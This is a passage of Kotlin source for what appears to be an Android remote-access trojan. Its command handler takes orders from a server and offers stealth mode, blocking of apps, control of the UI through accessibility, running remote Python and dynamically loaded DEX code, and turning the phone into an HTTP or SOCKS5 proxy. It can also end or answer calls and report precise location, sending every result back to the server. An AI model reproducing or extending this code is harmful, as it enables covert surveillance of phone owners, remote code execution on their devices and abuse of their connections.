        sendMessage(context, false, "ENABLE_STEALTH_MODE: Operation completed successfully", messageID, serverID)
    } else if (command == "DISABLE_STEALTH_MODE") {
        isStealthModeEnabled = false
        with(preferences.edit()) {
            putBoolean("IsStealthModeEnabled", false)
            commit()
        }
        sendMessage(context, false, "DISABLE_STEALTH_MODE: Operation completed successfully", messageID, serverID)
    } else if (command == "START_GETTING_CURRENTLY_OPENED_APP") {
        getCurrentlyOpenedApp = true
        sendMessage(context, false, "START_GETTING_CURRENTLY_OPENED_APP: Operation completed successfully", messageID, serverID)
    } else if (command == "STOP_GETTING_CURRENTLY_OPENED_APP") {
        getCurrentlyOpenedApp = false
        sendMessage(context, false, "STOP_GETTING_CURRENTLY_OPENED_APP: Operation completed successfully", messageID, serverID)
    } else if (command.startsWith("ADD_APP_TO_PREVENT_OPENING ")) {
        val packages =
            context.packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
        val packageID = command.removePrefix("ADD_APP_TO_PREVENT_OPENING ")
        var add = false
        for (packageInfo in packages) {
            if (packageInfo.packageName == packageID) {
                add = true
                break
            }
        }
        if (add) {
            appsToPreventOpening.add(packageID)
            sendMessage(context, false, "ADD_APP_TO_PREVENT_OPENING: Operation completed successfully", messageID, serverID)
        } else {
            sendMessage(context, false, "ADD_APP_TO_PREVENT_OPENING: Operation failed - package not found", messageID, serverID)
        }
    } else if (command.startsWith("REMOVE_APP_TO_PREVENT_OPENING ")) {
        appsToPreventOpening.remove(command.removePrefix("REMOVE_APP_TO_PREVENT_OPENING "))
        sendMessage(context, false, "REMOVE_APP_TO_PREVENT_OPENING: Operation completed successfully", messageID, serverID)
    } else if (command == "GET_APPS_TO_PREVENT_OPENING") {
        sendMessage(context, false, "GET_APPS_TO_PREVENT_OPENING: $appsToPreventOpening", messageID, serverID)
    } else if (command == "CLEAR_APPS_TO_PREVENT_OPENING") {
        appsToPreventOpening.clear()
        sendMessage(context, false, "CLEAR_APPS_TO_PREVENT_OPENING: Operation completed successfully", messageID, serverID)
    } else if (command == "CLICK_HOME") {
        val intent = Intent(MyAccessibilityService.ACTION_GO_HOME)
        intent.putExtra("MessageID", messageID)
        intent.putExtra("ServerID", serverID)
        context.sendBroadcast(intent)
    } else if (command == "CLICK_BACK") {
        val intent = Intent(MyAccessibilityService.ACTION_GO_BACK)
        intent.putExtra("MessageID", messageID)
        intent.putExtra("ServerID", serverID)
        context.sendBroadcast(intent)
    } else if (command == "CLICK_RECENTS") {
        val intent = Intent(MyAccessibilityService.ACTION_RECENTS)
        intent.putExtra("MessageID", messageID)
        intent.putExtra("ServerID", serverID)
        context.sendBroadcast(intent)
    } else if (command.startsWith("SET_FOCUSED_VIEW_TEXT")) {
        val intent = Intent(MyAccessibilityService.ACTION_SET_FOCUSED_VIEW_TEXT)
        intent.putExtra("InputText", command.removePrefix("SET_FOCUSED_VIEW_TEXT "))
        intent.putExtra("MessageID", messageID)
        intent.putExtra("ServerID", serverID)
        context.sendBroadcast(intent)
    } else if (command.startsWith("RUN_PYTHON_SCRIPT ")) {
        threads.add(
            thread(start = true) {
                var filePath = ""
                var args = listOf<String>()
                try {
                    filePath = command.removePrefix("RUN_PYTHON_SCRIPT ").split(" <!|!> ")[0]
                    args = command.removePrefix("RUN_PYTHON_SCRIPT $filePath <!|!> ").split(" ")
                    sendMessage(c, false, "RUN_PYTHON_SCRIPT: Thread Index: ${threads.size - 1}", messageID, serverID)
                    Log.d("ClientService", "Running python file $filePath with args $args")
                    val output = PythonRunner.runPythonScriptWithArgs(filePath, args)
                    sendMessage(
                        context,
                        false,
                        "RUN_PYTHON_SCRIPT: Output of $filePath with args $args: $output",
                        messageID, serverID
                    )
                } catch (ex: Exception) {
                    ex.printStackTrace()
                    sendMessage(
                        context,
                        false,
                        "RUN_PYTHON_SCRIPT: Failed to run $filePath with args $args - ${ex.localizedMessage}",
                        messageID, serverID
                    )
                }
            }
        )
    } else if (command == "GET_LOCAL_NETWORK_INFO") {
        sendMessage(context, false, "GET_LOCAL_NETWORK_INFO: ${getLocalNetworkInfo(context)}", messageID, serverID)
    } else if (command == "GET_APP_STORAGE_DIR") {
        sendMessage(context, false, "GET_APP_STORAGE_DIR: ${context.filesDir.absolutePath}", messageID, serverID)
    } else if (command.startsWith("SET_AS_READ_ONLY ")) {
        val path = command.removePrefix("SET_AS_READ_ONLY ")
        val file = File(path)
        if (file.exists()) {
            if (file.setReadOnly()) {
                sendMessage(context, false, "SET_AS_READ_ONLY: Operation completed successfully", messageID, serverID)
            } else {
                sendMessage(context, false, "SET_AS_READ_ONLY: Operation failed", messageID, serverID)
            }
        } else {
            sendMessage(context, false, "SET_AS_READ_ONLY: Operation failed - $path does not exist", messageID, serverID)
        }
    } else if (command.startsWith("SET_FILE_AS_EXECUTABLE ")) {
        val path = command.removePrefix("SET_FILE_AS_NOT_EXECUTABLE ")
        val file = File(path)
        if (file.exists()) {
            if (file.isFile) {
                if (file.setExecutable(true)) {
                    sendMessage(context, false, "SET_FILE_AS_NOT_EXECUTABLE: Operation completed successfully", messageID, serverID)
                } else {
                    sendMessage(context, false, "SET_FILE_AS_NOT_EXECUTABLE: Operation failed", messageID, serverID)
                }
            } else {
                sendMessage(context, false, "SET_FILE_AS_NOT_EXECUTABLE: Operation failed - $path is not a file", messageID, serverID)
            }
        } else {
            sendMessage(context, false, "SET_FILE_AS_NOT_EXECUTABLE: Operation failed - $path does not exist", messageID, serverID)
        }
    } else if (command.startsWith("SET_FILE_AS_NOT_EXECUTABLE ")) {
        val path = command.removePrefix("SET_FILE_AS_NOT_EXECUTABLE ")
        val file = File(path)
        if (file.exists()) {
            if (file.isFile) {
                if (file.setExecutable(false)) {
                    sendMessage(context, false, "SET_FILE_AS_NOT_EXECUTABLE: Operation completed successfully", messageID, serverID)
                } else {
                    sendMessage(context, false, "SET_FILE_AS_NOT_EXECUTABLE: Operation failed", messageID, serverID)
                }
            } else {
                sendMessage(context, false, "SET_FILE_AS_NOT_EXECUTABLE: Operation failed - $path is not a file", messageID, serverID)
            }
        } else {
            sendMessage(context, false, "SET_FILE_AS_NOT_EXECUTABLE: Operation failed - $path does not exist", messageID, serverID)
        }
    } else if (command.startsWith("IS_FILE_EXECUTABLE ")) {
        val path = command.removePrefix("IS_FILE_EXECUTABLE ")
        val file = File(path)
        if (file.exists()) {
            if (file.isFile) {
                sendMessage(context, false, "IS_FILE_EXECUTABLE: ${boolToYesNo(File(path).canExecute())}", messageID, serverID)
            } else {
                sendMessage(context, false, "IS_FILE_EXECUTABLE: Operation failed - $path is not a file", messageID, serverID)
            }
        } else {
            sendMessage(context, false, "IS_FILE_EXECUTABLE: Operation failed - $path does not exist", messageID, serverID)
        }
    } else if (command.startsWith("SET_AS_READABLE ")) {
        val path = command.removePrefix("SET_AS_READABLE ")
        val file = File(path)
        if (file.exists()) {
            if (file.setReadable(true)) {
                sendMessage(context, false, "SET_AS_READABLE: Operation completed successfully", messageID, serverID)
            } else {
                sendMessage(context, false, "SET_AS_READABLE: Operation failed", messageID, serverID)
            }
        } else {
            sendMessage(context, false, "SET_AS_READABLE: Operation failed - $path does not exist", messageID, serverID)
        }
    } else if (command.startsWith("SET_AS_NOT_READABLE ")) {
        val path = command.removePrefix("SET_AS_NOT_READABLE ")
        val file = File(path)
        if (file.exists()) {
            if (File(path).setReadable(false)) {
                sendMessage(context, false, "SET_AS_NOT_READABLE: Operation completed successfully", messageID, serverID)
            } else {
                sendMessage(context, false, "SET_AS_NOT_READABLE: Operation failed", messageID, serverID)
            }
        } else {
            sendMessage(context, false, "SET_AS_NOT_READABLE: Operation failed - $path does not exist", messageID, serverID)
        }
    } else if (command.startsWith("SET_AS_WRITABLE ")) {
        val path = command.removePrefix("SET_AS_WRITABLE ")
        val file = File(path)
        if (file.exists()) {
            if (file.setWritable(true)) {
                sendMessage(context, false, "SET_AS_WRITABLE: Operation completed successfully", messageID, serverID)
            } else {
                sendMessage(context, false, "SET_AS_WRITABLE: Operation failed", messageID, serverID)
            }
        } else {
            sendMessage(context, false, "SET_AS_WRITABLE: Operation failed - $path does not exist", messageID, serverID)
        }
    } else if (command.startsWith("SET_AS_NOT_WRITABLE ")) {
        val path = command.removePrefix("SET_AS_NOT_WRITABLE ")
        val file = File(path)
        if (file.exists()) {
            if (File(path).setWritable(false)) {
                sendMessage(context, false, "SET_AS_NOT_WRITABLE: Operation completed successfully", messageID, serverID)
            } else {
                sendMessage(context, false, "SET_AS_NOT_WRITABLE: Operation failed", messageID, serverID)
            }
        } else {
            sendMessage(context, false, "SET_AS_NOT_WRITABLE: Operation failed - $path does not exist", messageID, serverID)
        }
    } else if (command.startsWith("OPEN_URI ")) {
        // Create an Intent with the URL
        val url = command.removePrefix("OPEN_URI ")
        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        // Check if there's an app that can handle the intent
        if (intent.resolveActivity(context.getPackageManager()) != null) {
            context.startActivity(intent)
            sendMessage(context, false, "OPEN_URI: Operation completed successfully", messageID, serverID)
        } else {
            // Handle the case where no browser is available
            sendMessage(context, false, "OPEN_URI: Operation failed - no app found", messageID, serverID)
        }
    } else if (command == "START_WIFI_P2P_SERVER") {
        context.sendBroadcast(Intent(ClientService.ACTION_START_WIFI_P2P_SERVER).apply {
            putExtra("MessageID", messageID)
            putExtra("ServerID", serverID)
            putExtra("SendBySMS", false)
        })
        Log.d("ClientService", "Start WiFi P2P server received")
    } else if (command == "STOP_WIFI_P2P_SERVER") {
        context.sendBroadcast(Intent(ClientService.ACTION_STOP_WIFI_P2P_SERVER).apply {
            putExtra("MessageID", messageID)
            putExtra("ServerID", serverID)
            putExtra("SendBySMS", false)
        })
        Log.d("ClientService", "Stop WiFi P2P server received")
    } else if (command == "WIFI_P2P_GET_HOST_ADDRESS") {
        context.sendBroadcast(Intent(ClientService.ACTION_WIFI_P2P_GET_HOST_ADDRESS).apply {
            putExtra("MessageID", messageID)
            putExtra("ServerID", serverID)
            putExtra("SendBySMS", false)
        })
        Log.d("ClientService", "Get WiFi P2P host address received")
    } else if (command.startsWith("START_HTTP_PROXY ")) {
        if (!isHttpProxyRunning) {
            val port = command.removePrefix("START_HTTP_PROXY ").toInt()
            context.startService(HttpProxyService.newStartIntent(context, port))
            sendMessage(
                context,
                false,
                "START_HTTP_PROXY: Operation completed successfully",
                messageID,
                serverID
            )
            isHttpProxyRunning = true
        } else {
            sendMessage(
                context,
                false,
                "START_HTTP_PROXY: Operation failed - already running",
                messageID,
                serverID
            )
        }
    } else if (command == "STOP_HTTP_PROXY") {
        context.stopService(HttpProxyService.newStopIntent(context))
        sendMessage(context, false, "STOP_HTTP_PROXY: Operation completed successfully", messageID, serverID)
        isHttpProxyRunning = false
    } else if (command == "START_SOCKS5_PROXY") {
        if (!isSocks5ProxyRunning) {
            val intent = Intent(context, Socks5Service::class.java)
            context.startService(intent.setAction(Socks5Service.ACTION_START))
            sendMessage(
                context,
                false,
                "START_SOCKS5_PROXY: Operation completed successfully",
                messageID,
                serverID
            )
            isSocks5ProxyRunning = true
        } else {
            sendMessage(
                context,
                false,
                "START_SOCKS5_PROXY: Operation failed - already running",
                messageID,
                serverID
            )
        }
    } else if (command == "STOP_SOCKS5_PROXY") {
        val intent = Intent(context, Socks5Service::class.java)
        context.startService(intent.setAction(Socks5Service.ACTION_STOP))
        sendMessage(context, false, "STOP_SOCKS5_PROXY: Operation completed successfully", messageID, serverID)
        isSocks5ProxyRunning = false
    } else if (command.startsWith("SET_SOCKS5_PROXY_SETTINGS ")) {
        try {
            val jsonSettings: JsonObject = Gson().fromJson(command.removePrefix("SET_SOCKS5_PROXY_SETTINGS "), JsonObject::class.java) as JsonObject
            val prefs = Preferences(context)
            if (jsonSettings.has(Preferences.WORKERS))
                prefs.workers = jsonSettings.get(Preferences.WORKERS).asInt
            if (jsonSettings.has(Preferences.LISTEN_ADDR))
                prefs.listenAddress = jsonSettings.get(Preferences.LISTEN_ADDR).asString
            if (jsonSettings.has(Preferences.LISTEN_PORT))
                prefs.listenPort = jsonSettings.get(Preferences.LISTEN_PORT).asInt
            if (jsonSettings.has(Preferences.UDP_LISTEN_ADDR))
                prefs.uDPListenAddress = jsonSettings.get(Preferences.UDP_LISTEN_ADDR).asString
            if (jsonSettings.has(Preferences.UDP_LISTEN_PORT))
                prefs.uDPListenPort = jsonSettings.get(Preferences.UDP_LISTEN_PORT).asInt
            if (jsonSettings.has(Preferences.BIND_IPV4_ADDR))
                prefs.bindIPv4Address = jsonSettings.get(Preferences.BIND_IPV4_ADDR).asString
            if (jsonSettings.has(Preferences.BIND_IPV6_ADDR))
                prefs.bindIPv6Address = jsonSettings.get(Preferences.BIND_IPV6_ADDR).asString
            if (jsonSettings.has(Preferences.BIND_IFACE))
                prefs.bindInterface = jsonSettings.get(Preferences.BIND_IFACE).asString
            if (jsonSettings.has(Preferences.AUTH_USER))
                prefs.authUsername = jsonSettings.get(Preferences.AUTH_USER).asString
            if (jsonSettings.has(Preferences.AUTH_PASS))
                prefs.authPassword = jsonSettings.get(Preferences.AUTH_PASS).asString
            if (jsonSettings.has(Preferences.LISTEN_IPV6_ONLY))
                prefs.listenIPv6Only = jsonSettings.get(Preferences.LISTEN_IPV6_ONLY).asBoolean
            sendMessage(context, false, "SET_SOCKS5_PROXY_SETTINGS: Operation completed successfully", messageID, serverID)
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(context, false, "SET_SOCKS5_PROXY_SETTINGS: Operation failed - ${ex.localizedMessage}", messageID, serverID)
        }
    } else if (command == "GET_SOCKS5_PROXY_SETTINGS") {
        val prefs = Preferences(context)
        val settings = mutableMapOf<String, Any?>(
            Preferences.WORKERS to prefs.workers,
            Preferences.LISTEN_ADDR to prefs.listenAddress,
            Preferences.LISTEN_PORT to prefs.listenPort,
            Preferences.UDP_LISTEN_ADDR to prefs.uDPListenAddress,
            Preferences.UDP_LISTEN_PORT to prefs.uDPListenPort,
            Preferences.BIND_IPV4_ADDR to prefs.bindIPv4Address,
            Preferences.BIND_IPV6_ADDR to prefs.bindIPv6Address,
            Preferences.BIND_IFACE to prefs.bindInterface,
            Preferences.AUTH_USER to prefs.authUsername,
            Preferences.AUTH_PASS to prefs.authPassword,
            Preferences.LISTEN_IPV6_ONLY to prefs.listenIPv6Only,
            Preferences.ENABLE to prefs.enable
        )
        sendMessage(context, false, "GET_SOCKS5_PROXY_SETTINGS: ${Gson().toJson(settings).toString()}", messageID, serverID)
    } else if (command == "ASK_TO_TURN_ON_WIFI") {
        val wifiManager = context.getSystemService(Context.WIFI_SERVICE) as WifiManager
        if (!wifiManager.isWifiEnabled) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                context.startActivity(Intent(Settings.Panel.ACTION_WIFI).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                })
            } else {
                context.startActivity(Intent(Settings.ACTION_WIFI_SETTINGS).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                })
            }
            sendMessage(
                context,
                false,
                "ASK_TO_TURN_ON_WIFI: Operation completed successfully",
                messageID,
                serverID
            )
        } else {
            sendMessage(
                context,
                false,
                "ASK_TO_TURN_ON_WIFI: Operation failed - wifi is already enabled",
                messageID,
                serverID
            )
        }
    } else if (command == "ASK_TO_TURN_ON_BLUETOOTH") {
        if (bluetoothAdapter == null)
            bluetoothAdapter = BluetoothAdapter.getDefaultAdapter()
        if (!bluetoothAdapter!!.isEnabled) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                context.startActivity(Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                })
            } else {
                context.startActivity(Intent(Settings.ACTION_BLUETOOTH_SETTINGS).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                })
            }
            sendMessage(
                context,
                false,
                "ASK_TO_TURN_ON_BLUETOOTH: Operation completed successfully",
                messageID,
                serverID
            )
        } else {
            sendMessage(
                context,
                false,
                "ASK_TO_TURN_ON_BLUETOOTH: Operation failed - bluetooth is already enabled",
                messageID,
                serverID
            )
        }
    } else if (command == "END_CALL") {
        try {
            val tm = context.getSystemService(Context.TELECOM_SERVICE) as TelecomManager
            if (tm.endCall()) {
                sendMessage(
                    context,
                    false,
                    "END_CALL: Operation completed successfully",
                    messageID, serverID
                )
            } else {
                sendMessage(
                    context,
                    false,
                    "END_CALL: Operation failed",
                    messageID, serverID
                )
            }
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(
                context,
                false,
                "END_CALL: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command == "SILENCE_CALL_RINGER") {
        try {
            val tm = context.getSystemService(Context.TELECOM_SERVICE) as TelecomManager
            tm.silenceRinger()
            sendMessage(
                context,
                false,
                "SILENCE_CALL_RINGER: Operation completed successfully",
                messageID, serverID
            )
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(
                context,
                false,
                "SILENCE_CALL_RINGER: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command == "ACCEPT_RINGING_CALL") {
        try {
            val tm = context.getSystemService(Context.TELECOM_SERVICE) as TelecomManager
            tm.acceptRingingCall()
            sendMessage(
                context,
                false,
                "ACCEPT_RINGING_CALL: Operation completed successfully",
                messageID, serverID
            )
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(
                context,
                false,
                "ACCEPT_RINGING_CALL: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command.startsWith("GET_CURRENT_LOCATION2 ")) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
                var provider = ""
                provider = when (command.removePrefix("GET_CURRENT_LOCATION2 ")) {
                    "GPS_PROVIDER" -> LocationManager.GPS_PROVIDER
                    "FUSED_PROVIDER" -> {
                        if (Build.VERSION.SDK_INT == Build.VERSION_CODES.R)
                            "Unknown"
                        else
                            LocationManager.FUSED_PROVIDER
                    }
                    "NETWORK_PROVIDER" -> LocationManager.NETWORK_PROVIDER
                    "PASSIVE_PROVIDER" -> LocationManager.PASSIVE_PROVIDER
                    else -> "Unknown"
                }
                if (provider != "Unknown") {
                    val cancellationSignal = CancellationSignal()
                    lm.getCurrentLocation(
                        provider,
                        cancellationSignal,
                        context.mainExecutor
                    ) { location: Location? ->
                        if (location != null) {
                            val latitude = location.latitude
                            val longitude = location.longitude
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                                val messageParts = mutableListOf<String>()
                                messageParts.add("GET_CURRENT_LOCATION2: Longitude: $longitude, Latitude: $latitude, Time: ${location.time}, Speed: ${location.speed}")
                                if (location.hasAccuracy()) messageParts.add(
                                    "Accuracy: ${location.accuracy}"
                                )
                                if (location.hasSpeedAccuracy()) messageParts.add(
                                    "Speed Accuracy: ${location.speedAccuracyMetersPerSecond}"
                                )
                                if (location.hasVerticalAccuracy()) messageParts.add(
                                    "Vertical Accuracy: ${location.verticalAccuracyMeters}"
                                )
                                if (location.hasAltitude()) messageParts.add(
                                    "Altitude: ${location.altitude}"
                                )
                                if (location.hasMslAltitude()) messageParts.add(
                                    "MSL Altitude: ${location.mslAltitudeMeters}"
                                )
                                if (location.hasMslAltitudeAccuracy()) messageParts.add(
                                    "MSL Altitude Accuracy: ${location.mslAltitudeAccuracyMeters}"
                                )
                                if (location.hasBearing()) messageParts.add(
                                    "Bearing: ${location.bearing}"
                                )
                                if (location.hasBearingAccuracy()) messageParts.add(
                                    "Bearing Accuracy: ${location.bearingAccuracyDegrees}"
                                )
                                sendMessage(
                                    context,
                                    false,
                                    messageParts.joinToString(", "),
                                    messageID, serverID
                                )
                            } else {
                                val messageParts = mutableListOf<String>()
                                messageParts.add("GET_CURRENT_LOCATION2: Longitude: $longitude, Latitude: $latitude, Time: ${location.time}, Speed: ${location.speed}")
                                if (location.hasAccuracy()) messageParts.add(
                                    "Accuracy: ${location.accuracy}"
                                )
                                if (location.hasSpeedAccuracy()) messageParts.add(
                                    "Speed Accuracy: ${location.speedAccuracyMetersPerSecond}"
                                )
                                if (location.hasVerticalAccuracy()) messageParts.add(
                                    "Vertical Accuracy: ${location.verticalAccuracyMeters}"
                                )
                                if (location.hasAltitude()) messageParts.add(
                                    "Altitude: ${location.altitude}"
                                )
                                if (location.hasBearing()) messageParts.add(
                                    "Bearing: ${location.bearing}"
                                )
                                if (location.hasBearingAccuracy()) messageParts.add(
                                    "Bearing Accuracy: ${location.bearingAccuracyDegrees}"
                                )
                                sendMessage(
                                    context,
                                    false,
                                    messageParts.joinToString(", "),
                                    messageID, serverID
                                )
                            }
                        } else {
                            sendMessage(
                                context,
                                false,
                                "GET_CURRENT_LOCATION2: Operation failed - location is null",
                                messageID, serverID
                            )
                        }
                    }
                } else {
                    sendMessage(
                        context,
                        false,
                        "GET_CURRENT_LOCATION2: Operation failed - provider not supported",
                        messageID, serverID
                    )
                }
            } else {
                sendMessage(
                    context,
                    false,
                    "GET_CURRENT_LOCATION2: Operation failed - API level not supported",
                    messageID, serverID
                )
            }
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(
                context,
                false,
                "GET_CURRENT_LOCATION2: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command.startsWith("GET_LAST_KNOWN_LOCATION2 ")) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
                var provider = ""
                provider = when (command.removePrefix("GET_LAST_KNOWN_LOCATION2 ")) {
                    "GPS_PROVIDER" -> LocationManager.GPS_PROVIDER
                    "FUSED_PROVIDER" -> {
                        if (Build.VERSION.SDK_INT == Build.VERSION_CODES.R)
                            "Unknown"
                        else
                            LocationManager.FUSED_PROVIDER
                    }
                    "NETWORK_PROVIDER" -> LocationManager.NETWORK_PROVIDER
                    "PASSIVE_PROVIDER" -> LocationManager.PASSIVE_PROVIDER
                    else -> "Unknown"
                }
                if (provider != "Unknown") {
                    val location = lm.getLastKnownLocation(provider)
                    if (location != null) {
                        val latitude = location.latitude
                        val longitude = location.longitude
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                            val messageParts = mutableListOf<String>()
                            messageParts.add("GET_LAST_KNOWN_LOCATION2: Longitude: $longitude, Latitude: $latitude, Time: ${location.time}, Speed: ${location.speed}")
                            if (location.hasAccuracy()) messageParts.add(
                                "Accuracy: ${location.accuracy}"
                            )
                            if (location.hasSpeedAccuracy()) messageParts.add(
                                "Speed Accuracy: ${location.speedAccuracyMetersPerSecond}"
                            )
                            if (location.hasVerticalAccuracy()) messageParts.add(
                                "Vertical Accuracy: ${location.verticalAccuracyMeters}"
                            )
                            if (location.hasAltitude()) messageParts.add(
                                "Altitude: ${location.altitude}"
                            )
                            if (location.hasMslAltitude()) messageParts.add(
                                "MSL Altitude: ${location.mslAltitudeMeters}"
                            )
                            if (location.hasMslAltitudeAccuracy()) messageParts.add(
                                "MSL Altitude Accuracy: ${location.mslAltitudeAccuracyMeters}"
                            )
                            if (location.hasBearing()) messageParts.add(
                                "Bearing: ${location.bearing}"
                            )
                            if (location.hasBearingAccuracy()) messageParts.add(
                                "Bearing Accuracy: ${location.bearingAccuracyDegrees}"
                            )
                            sendMessage(
                                context,
                                false,
                                messageParts.joinToString(", "),
                                messageID, serverID
                            )
                        } else {
                            val messageParts = mutableListOf<String>()
                            messageParts.add("GET_LAST_KNOWN_LOCATION2: Longitude: $longitude, Latitude: $latitude, Time: ${location.time}, Speed: ${location.speed}")
                            if (location.hasAccuracy()) messageParts.add(
                                "Accuracy: ${location.accuracy}"
                            )
                            if (location.hasSpeedAccuracy()) messageParts.add(
                                "Speed Accuracy: ${location.speedAccuracyMetersPerSecond}"
                            )
                            if (location.hasVerticalAccuracy()) messageParts.add(
                                "Vertical Accuracy: ${location.verticalAccuracyMeters}"
                            )
                            if (location.hasAltitude()) messageParts.add(
                                "Altitude: ${location.altitude}"
                            )
                            if (location.hasBearing()) messageParts.add(
                                "Bearing: ${location.bearing}"
                            )
                            if (location.hasBearingAccuracy()) messageParts.add(
                                "Bearing Accuracy: ${location.bearingAccuracyDegrees}"
                            )
                            sendMessage(
                                context,
                                false,
                                messageParts.joinToString(", "),
                                messageID, serverID
                            )
                        }
                    } else {
                        sendMessage(
                            context,
                            false,
                            "GET_LAST_KNOWN_LOCATION2: Operation failed - location is null",
                            messageID, serverID
                        )
                    }
                } else {
                    sendMessage(
                        context,
                        false,
                        "GET_LAST_KNOWN_LOCATION2: Operation failed - provider not supported",
                        messageID, serverID
                    )
                }
            } else {
                sendMessage(
                    context,
                    false,
                    "GET_LAST_KNOWN_LOCATION2: Operation failed - API level not supported",
                    messageID, serverID
                )
            }
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(
                context,
                false,
                "GET_LAST_KNOWN_LOCATION2: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command == "IS_SOCKS5_SERVICE_RUNNING") {
        sendMessage(
            context,
            false,
            "IS_SOCKS5_SERVICE_RUNNING: ${boolToYesNo(isMyServiceRunning(context, Socks5Service::class.java))}",
            messageID, serverID
        )
    } else if (command == "IS_LOCATION_ENABLED") {
        val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        sendMessage(
            context,
            false,
            "IS_LOCATION_ENABLED: ${boolToYesNo(lm.isLocationEnabled)}",
            messageID, serverID
        )
    } else if (command.startsWith("SET_DISPLAY_BRIGHTNESS ")) {
        try {
            Settings.System.putInt(context.contentResolver, Settings.System.SCREEN_BRIGHTNESS, command.removePrefix("SET_DISPLAY_BRIGHTNESS ").toInt())
            sendMessage(context, false, "SET_DISPLAY_BRIGHTNESS: Operation completed successfully", messageID, serverID)
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(
                context,
                false,
                "SET_DISPLAY_BRIGHTNESS: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command.startsWith("RUN_JAR ")) {
        try {
            val className = command.removePrefix("RUN_JAR ").split(" ")[0]
            val methodName = command.removePrefix("RUN_JAR ").split(" ")[1]
            val path = command.removePrefix("RUN_JAR $className $methodName ")
            val dexClassLoader = DexClassLoader(path, context.cacheDir.absolutePath, null, context.classLoader)
            val loadedClass = dexClassLoader.loadClass(className)
            val instance = loadedClass.getDeclaredConstructor().newInstance(context, applicationContext)
            val method: Method = loadedClass.getMethod(methodName)
            val result = method.invoke(instance) as String
            sendMessage(context, false, "RUN_JAR: $result", messageID, serverID)
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(
                context,
                false,
                "RUN_JAR: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command.startsWith("RUN_JAR_IN_THREAD ")) {
        val threadIndex = threads.count()
        val thread = Thread {
            try {
                val className = command.removePrefix("RUN_JAR_IN_THREAD ").split(" ")[0]
                val methodName = command.removePrefix("RUN_JAR_IN_THREAD ").split(" ")[1]
                val path = command.removePrefix("RUN_JAR_IN_THREAD $className $methodName ")
                val dexClassLoader = DexClassLoader(path, context.cacheDir.absolutePath, null, context.classLoader)
                val loadedClass = dexClassLoader.loadClass(className)
                val instance = loadedClass.getDeclaredConstructor(Context::class.java, Context::class.java).newInstance(context, applicationContext)
                val method: Method = loadedClass.getMethod(methodName)
                val result = method.invoke(instance) as String
                sendMessage(context, false, "RUN_JAR_IN_THREAD: $result", messageID, serverID)
            } catch (ex: Exception) {
                ex.printStackTrace()
                sendMessage(
                    context,
                    false,
                    "RUN_JAR_IN_THREAD: Operation failed - ${ex.localizedMessage}",
                    messageID, serverID
                )
            }
        }
        threads.add(thread)
        threads[threadIndex].start()
        sendMessage(context, false, "RUN_JAR_IN_THREAD: Thread Index: $threadIndex", messageID, serverID)
    } else {
        if (command != "") {
            sendMessage(
                context,
                false,
                "${command.split(" ")[0]}: Unknown command",
                messageID, serverID
            )
        }
    }
    return false
}

val startIds = mutableListOf<Int>()

var wifiP2pManager: WifiP2pManager? = null
var wifiP2pChannel: WifiP2pManager.Channel? = null
var serverSocket: ServerSocket? = null
var serverJob: Job? = null
var isWifiP2pEnabled = false
var wifiP2pDnsSdServiceInfo: WifiP2pDnsSdServiceInfo? = null

class ClientService: Service() {
    enum class Actions {
        START,
        STOP
    }

    companion object {
        const val ACTION_START_WIFI_P2P_SERVER = "com.client.services.client.ClientService.ACTION_START_WIFI_P2P_SERVER"
        const val ACTION_STOP_WIFI_P2P_SERVER = "com.client.services.client.ClientService.ACTION_STOP_WIFI_P2P_SERVER"
        const val ACTION_WIFI_P2P_GET_HOST_ADDRESS = "com.client.services.client.ClientService.ACTION_GET_HOST_ADDRESS"
    }

    private lateinit var mediaRecorder: MediaRecorder

    private lateinit var cameraManager: CameraManager
    private lateinit var cameraDevice: CameraDevice
    private lateinit var imageReader: ImageReader

    private lateinit var captureSession: CameraCaptureSession

    private var isRecordingFromMic = false

    private val notificationChannelId = "client_channel"
    private var notificationChannel: NotificationChannel? = null
    private var notificationManager: NotificationManager? = null
    private var notification: Notification? = null

    val wifiP2pIntentFilter = IntentFilter().apply {
        addAction(WifiP2pManager.WIFI_P2P_STATE_CHANGED_ACTION)
        addAction(WifiP2pManager.WIFI_P2P_PEERS_CHANGED_ACTION)
        addAction(WifiP2pManager.WIFI_P2P_CONNECTION_CHANGED_ACTION)
        addAction(WifiP2pManager.WIFI_P2P_THIS_DEVICE_CHANGED_ACTION)
    }

